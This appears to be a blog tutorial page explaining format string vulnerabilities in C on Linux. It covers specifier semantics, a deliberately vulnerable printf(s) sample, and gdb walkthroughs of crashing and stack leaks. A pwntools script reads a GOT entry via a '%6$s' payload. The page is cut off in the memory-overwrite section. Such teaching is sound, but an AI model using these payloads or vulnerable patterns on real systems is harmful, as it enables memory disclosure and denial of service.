<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Computer, Network, Security">
    <meta name="description" content="a blog on Hexo">
    <meta name="author" content="TyeYeah">
    
    <title>
        
            Format String Vulnerability Intro |
        
        Relish the Moment
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/img/wang.svg">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2018,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
  </script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/logo.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               Relish the Moment
            </a>
        </div>

        <div class="right border-box">
            <div class="pc">
                <ul class="menu-list">
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                
                                HOME
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                
                                ARCHIVES
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                
                                TAGS
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                
                                CATEGORIES
                            </a>
                        </li>
                    
                        
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/"
                    >HOME</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives"
                    >ARCHIVES</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags"
                    >TAGS</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories"
                    >CATEGORIES</a>
                </li>
            
                
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about"
                    >ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        Format String Vulnerability Intro
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/img/aliwangwang.svg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">TyeYeah</span>
                                
                                    <span class="author-badge">Lv4</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2020-07-05 21:57:09</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Sun Oct 18 2020 20:40:38 GMT+0800">2020-10-18 20:40:38</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/Pwn/">Pwn</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/linux/">linux</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn/">pwn</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/format-string/">format-string</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>3k Words</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>18 Mins</span>
            </span>
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body">
                    

                    <p>The format string in many programming languages, refers to a control parameter used by a class of functions. It helps to output text in specific format, according to conversion specification or format specifiers that user set.</p>
<p>Here we discuss it on <code>Linux</code>.</p>
<h2 id="Format-String-Introduction"><a href="#Format-String-Introduction" class="headerlink" title="Format String Introduction"></a>Format String Introduction</h2><p>For <code>C</code> format string functions, characters are usually copied literally into the function’s output, but format specifiers, which start with a <code>%</code> character, indicate the location and method to translate a piece of data (such as a number) to characters.</p>
<p>We take <code>printf</code> as an example.<br><img   src="/imghost/fsvi/example.png"  alt="example"></p>
<p>Format string functions include:</p>
<table>
<thead>
<tr>
<th>method name</th>
<th>method function</th>
</tr>
</thead>
<tbody><tr>
<td>scanf</td>
<td>scan input format string</td>
</tr>
<tr>
<td>printf</td>
<td>output to stdout</td>
</tr>
<tr>
<td>fprintf</td>
<td>output to FILE stream</td>
</tr>
<tr>
<td>vprintf</td>
<td>output to stdout according to parameter list</td>
</tr>
<tr>
<td>vfprintf</td>
<td>output to FILE stream according to parameter list</td>
</tr>
<tr>
<td>sprintf</td>
<td>output to string</td>
</tr>
<tr>
<td>snprintf</td>
<td>output assigned number chars to string</td>
</tr>
<tr>
<td>vsprintf</td>
<td>output to string according to parameter list</td>
</tr>
<tr>
<td>vsnprintf</td>
<td>output specified number chars to string according to …</td>
</tr>
<tr>
<td>setproctitle</td>
<td>set argv</td>
</tr>
<tr>
<td>syslog</td>
<td>output log</td>
</tr>
<tr>
<td>err, verr, warn, vwarn, etc.</td>
<td>error and warning output</td>
</tr>
</tbody></table>
<p>Basic format is <code>%[parameter][flags][field width][.precision][length]type</code>, and you can check <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Printf_format_string" >this site<i class="fas fa-external-link-alt"></i></a> for meanings of every patterns.</p>
<p>Things we need to focus on:</p>
<ul>
<li>parameter<ul>
<li><code>n$</code>:        get specific parameter in format string</li>
</ul>
</li>
<li>flag</li>
<li>field width<ul>
<li>minimum width to output</li>
</ul>
</li>
<li>precision<ul>
<li>maximum width to output</li>
</ul>
</li>
<li>length<ul>
<li><code>hh</code>:        output a byte</li>
<li><code>h</code>:         Output a double byte</li>
</ul>
</li>
<li>type<ul>
<li><code>d/i</code>:       signed int</li>
<li><code>u</code>:         unsigned int</li>
<li><code>x/X</code>:       hex unsigned int</li>
<li><code>o</code>:         octal unsigned int</li>
<li><code>s</code>:         string (var assigns start address)</li>
<li><code>c</code>:         character</li>
<li><code>p</code>:         variable address</li>
<li><code>n</code>:         number of written chars</li>
<li><code>%</code>:         just <code>%</code></li>
</ul>
</li>
</ul>
<h2 id="Vulnerability-Principle"><a href="#Vulnerability-Principle" class="headerlink" title="Vulnerability Principle"></a>Vulnerability Principle</h2><p>The <code>printf</code> reads given characters one by one.</p>
<ul>
<li>If not <code>%</code>, output to <code>stdout</code>. </li>
<li>If <code>%</code> appears, read next,<ul>
<li>If no chars following, error report.</li>
<li>If <code>%</code> appears, output <code>%</code>.</li>
<li>If other chars show up, analyze and output according to the parameters.</li>
</ul>
</li>
</ul>
<p>If we write <code>printf</code> wrongly like:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>Without any following parameters, <code>printf</code> will get variables from the stack memory (from top of the stack to bottom).<br>For one thing, if it reads illegal data, the program crashes; for another thing, the output can be regarded as stack data leaking.</p>
<h2 id="Format-String-Exploit"><a href="#Format-String-Exploit" class="headerlink" title="Format String Exploit"></a>Format String Exploit</h2><p>Vulnerability comes with incorrect usage, like no parameters given after the format specifiers.</p>
<p>Here is a vulnerable code sample (fmtstr.c):</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>,b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">        <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;output:&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(s);      <span class="comment">//vulnerable</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And the instruction to compile (we start from 32-bit, and no protection program):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -fno-stack-protector -no-pie -o fmtstr fmtstr.c</span><br></pre></td></tr></table></figure>

<p>There are 3 ways to exploit:</p>
<ul>
<li>program crashing</li>
<li>memory data leaking</li>
<li>memory data overwriting</li>
</ul>
<h3 id="Crash-program"><a href="#Crash-program" class="headerlink" title="Crash program"></a>Crash program</h3><p>Use lots of <code>%s</code> to let program read many undefined memory areas is the easist way.<br>This may not let you control program, but crashing remote service contributes to attacks like denial of service.</p>
<p>But have you ever considered, how many <code>%s</code> are enough? and why?<br>We play with <code>fmtstr</code> that is compiled above. The relationship between inputs and outputs is:</p>
<table>
<thead>
<tr>
<th>Input</th>
<th>Output</th>
</tr>
</thead>
<tbody><tr>
<td>%s%s%s</td>
<td>%s%s%sW.</td>
</tr>
<tr>
<td>%s%s%s%s%s</td>
<td>%s%s%s%s%sW.(null)(null)</td>
</tr>
<tr>
<td>%s%s%s%s%s%s…</td>
<td>Segmentation fault</td>
</tr>
</tbody></table>
<p>USe gdb to analyze. Set a breakpoint to debug.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ gdb fmtstr -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> <span class="string">&#x27;gef&#x27;</span> to start, <span class="string">&#x27;gef config&#x27;</span> to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from fmtstr...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> fmtstr)</span><br><span class="line">gef➤  b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x8049030</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/fmtstr</span><br><span class="line">input:</span><br><span class="line">%s%s%s          <span class="comment"># my input</span></span><br><span class="line">output:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e31a90 <span class="keyword">in</span> <span class="built_in">printf</span> () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Let’s look at the stack, since this vulnerability comes from no following parameters for potential format specifiers, so the format string functions will take parameters from stack.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">────────────────── stack ────</span><br><span class="line">0xffffd38c│+0x0000: 0x080491fc  →  &lt;main+106&gt; add esp, 0x10     ← <span class="variable">$esp</span></span><br><span class="line">0xffffd390│+0x0004: 0xffffd3a8  →  <span class="string">&quot;%s%s%s&quot;</span></span><br><span class="line">0xffffd394│+0x0008: 0xffffd3a8  →  <span class="string">&quot;%s%s%s&quot;</span>     <span class="comment"># 1st</span></span><br><span class="line">0xffffd398│+0x000c: 0xf7ffd940  →  0x00000000   <span class="comment"># 2nd</span></span><br><span class="line">0xffffd39c│+0x0010: 0x080491a9  →  &lt;main+23&gt; add ebx, 0x2e57    <span class="comment"># 3rd</span></span><br><span class="line">0xffffd3a0│+0x0014: 0x00000000      <span class="comment"># 4th</span></span><br><span class="line">0xffffd3a4│+0x0018: 0x00000000      <span class="comment"># 5th</span></span><br><span class="line">0xffffd3a8│+0x001c: <span class="string">&quot;%s%s%s&quot;</span>        <span class="comment"># 6th</span></span><br><span class="line">...</span><br><span class="line">───────────────────</span><br></pre></td></tr></table></figure>
<p>The current top of stack is <code>0xffffd38c</code>, storing <code>esp</code>. Value in <code>0xffffd390</code> is 1st parameter of <code>printf</code> function, while value in <code>0xffffd394</code> is 1st parameter of format string (2nd parameter of <code>printf</code>).</p>
<p>We use <code>%s</code> to output what the values saved in stack point to (regard values in stack as string starting addresses). Let’s see what exactly do they point to.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/x xffffd3a8</span><br><span class="line">0xffffd3a8:     0x73257325  </span><br><span class="line">gef➤  x/x 0xf7ffd940</span><br><span class="line">0xf7ffd940:     0x00000000</span><br><span class="line">gef➤  x/x 0x080491a9</span><br><span class="line">0x80491a9 &lt;main+23&gt;:    0x2e57c381</span><br><span class="line">gef➤  x/x 0x00000000</span><br><span class="line">0x0:    Cannot access memory at address 0x0</span><br><span class="line">gef➤  x/x <span class="string">&quot;%s%s%s&quot;</span>        <span class="comment"># the 6th parameter for format string </span></span><br><span class="line">0xf7fce670:     0x73257325</span><br><span class="line">gef➤  x/x %s%s%s</span><br><span class="line">A syntax error <span class="keyword">in</span> expression, near <span class="string">&#x27;%s%s%s&#x27;</span>.</span><br><span class="line">gef➤  x/x 0xffffd3a8</span><br><span class="line">0xffffd3a8:     0x73257325</span><br><span class="line">gef➤  x/x 0x73257325</span><br><span class="line">0x73257325:     Cannot access memory at address 0x73257325</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">%s%s%sW.</span><br><span class="line">[Inferior 1 (process 1419) exited normally]</span><br></pre></td></tr></table></figure>
<p>The above are display of 1st, 2nd, 3rd, 4th … parameter that in order.<br>Normally values in stack will change on different pc, and different time to run. We can see that our input is 6th parameter, however this is fixed, because this order is determined by order of program instructions.</p>
<p>Here we can also know how many <code>%s</code> are enough to crash it. Each <code>%s</code> we feed will print a item on the stack, and when the item (regarded as address) points to somewhere inaccessible, program breaks down.</p>
<p>As we can see, though 4th and 5th parameter are <code>0x00000000</code> which points to a definitely inaccessible place, they are translated as pointing to null. So the first parameter that causes crashing is actually 6th item. If you notice, it happens to be the input string.<br>So the answer is, 6 <code>%s</code> is just enough (the more the better).</p>
<h3 id="Leak-Memory"><a href="#Leak-Memory" class="headerlink" title="Leak Memory"></a>Leak Memory</h3><p>It includes the following operations.</p>
<ul>
<li>Leak stack memory data<ul>
<li>Get variable value</li>
<li>Get memory that var value (address) points to</li>
</ul>
</li>
<li>Leak any address data<ul>
<li>Use <code>GOT</code> to get <code>libc</code> addr</li>
<li>To dump all the program</li>
</ul>
</li>
</ul>
<p>The basic principle is using format like <code>%n$p</code> or <code>%n$x</code>, even <code>%n$s</code> to leak data in stack memory. <code>%p</code> is a better choice than <code>%x</code> to print data, because <code>%x</code> will print different content in 32-bit and 64-bit environments.</p>
<h4 id="Leak-Stack"><a href="#Leak-Stack" class="headerlink" title="Leak Stack"></a>Leak Stack</h4><p>The format string <code>%order$p</code> refers to printing the number <code>order</code> format string parameter. We can use <code>%10000000$p</code> to leak 10000000th parameter, instead of using 10,000,000 <code>%p</code> like what former section does. In theory, we can disclose whatever item on stack.</p>
<p>Run <code>fmtstr</code> to show the effect. I feed <code>%6$p</code> to leak input string.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ gdb fmtstr -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> <span class="string">&#x27;gef&#x27;</span> to start, <span class="string">&#x27;gef config&#x27;</span> to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from fmtstr...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> fmtstr)</span><br><span class="line">gef➤  b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x8049030</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/fmtstr</span><br><span class="line">input:</span><br><span class="line">%6<span class="variable">$p</span></span><br><span class="line">output:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e31a90 <span class="keyword">in</span> <span class="built_in">printf</span> () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">...</span><br><span class="line">─────────────────── stack ────</span><br><span class="line">0xffffd39c│+0x0000: 0x080491fc  →  &lt;main+106&gt; add esp, 0x10     ← <span class="variable">$esp</span></span><br><span class="line">0xffffd3a0│+0x0004: 0xffffd3b8  →  <span class="string">&quot;%6<span class="variable">$p</span>&quot;</span></span><br><span class="line">0xffffd3a4│+0x0008: 0xffffd3b8  →  <span class="string">&quot;%6<span class="variable">$p</span>&quot;</span>       <span class="comment"># 1st</span></span><br><span class="line">0xffffd3a8│+0x000c: 0xf7ffd940  →  0x00000000   <span class="comment"># 2nd</span></span><br><span class="line">0xffffd3ac│+0x0010: 0x080491a9  →  &lt;main+23&gt; add ebx, 0x2e57    <span class="comment"># 3rd</span></span><br><span class="line">0xffffd3b0│+0x0014: 0x00000000      <span class="comment"># 4th</span></span><br><span class="line">0xffffd3b4│+0x0018: 0x00000000      <span class="comment"># 5th</span></span><br><span class="line">0xffffd3b8│+0x001c: <span class="string">&quot;%6<span class="variable">$p</span>&quot;</span>          <span class="comment"># 6th</span></span><br><span class="line">─────────────────── </span><br><span class="line">...</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">0x70243625          <span class="comment"># &quot;%6$p&quot; ascii codes</span></span><br><span class="line">[Inferior 1 (process 176) exited normally]</span><br></pre></td></tr></table></figure>
<p><code>%p</code> is used to print pointers, <code>%x</code> is used to print data in hex, while <code>%s</code> prints what a pointer points to. so we can use it to do more creative things.</p>
<h4 id="Leak-Any"><a href="#Leak-Any" class="headerlink" title="Leak Any"></a>Leak Any</h4><p>Now we can find our input in stack, and we have <code>%s</code> to leak what a pointer points to. What if we input address to be a pointer, and use <code>%s</code> to leak where it points? In theory, we can leak anywhere.</p>
<p>The basic exploit format is <code>addr%order$s</code>. As the address is hard to input in <code>stdin</code>, so I choose <code>pwntools</code> to do this.<br>Choosing <code>__isoc99_scanf@got</code> as the aim to leak is to prove the ability of leaking anywhere. The exploit script <code>leakanywhere.py</code> is:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./fmtstr&#x27;</span>)</span><br><span class="line">fmts = ELF(<span class="string">&#x27;./fmtstr&#x27;</span>)</span><br><span class="line">__isoc99_scanf_got = fmts.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>] <span class="comment"># get `got` address of `scanf`</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(__isoc99_scanf_got)</span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">&#x27;%6$s&#x27;</span>      <span class="comment"># building payload</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">gdb.attach(sh)                                  <span class="comment"># gdb debug</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">recv = sh.recv()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;--------------------------&#x27;</span></span><br><span class="line"><span class="built_in">print</span> recv</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;--------------------------&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;scanf@got is: &#x27;</span>+<span class="built_in">hex</span>(u32(recv[<span class="number">12</span>:<span class="number">16</span>]))    <span class="comment"># get leaked &#x27;got&#x27; item content</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>The result of running it:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ python leakanywhere.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./fmtstr&#x27;</span>: pid 2770</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Sandbox/fmtstr&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">0x804c01c</span><br><span class="line">\x1c\x04%6<span class="variable">$s</span></span><br><span class="line">[*] running <span class="keyword">in</span> new terminal: /usr/bin/gdb -q  <span class="string">&quot;./fmtstr&quot;</span> 2770</span><br><span class="line">[+] Waiting <span class="keyword">for</span> debugger: Done</span><br><span class="line">input:</span><br><span class="line"></span><br><span class="line">--------------------------</span><br><span class="line">output:</span><br><span class="line">\x1c\x04\x90j��</span><br><span class="line"></span><br><span class="line">--------------------------</span><br><span class="line">scanf@got is: 0xf7d76a90</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./fmtstr&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 2770)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<p>The address <code>0xf7d76a90</code> seems to be what <code>scanf@got</code> points to (where scanf really is). It changes everytime you run the script.</p>
<h3 id="Overwrite-Memory"><a href="#Overwrite-Memory" class="headerlink" title="Overwrite Memory"></a>Overwrite Memory</h3><p>Another impressive format specifier is <code>%n</code>, outputting not characters, but number of successfully printed characters. This provides us with a new method to write things to assigned place.<br>The basic principle of overwrite memory is using format like <code>...[overwrite addr]....%[overwrite offset]$n</code>, and the <code>...</code> means padding we need to make a certain amount for output.</p>
<p>We write <code>overwrite.c</code> as an example to better find out what we can do:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">        <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span 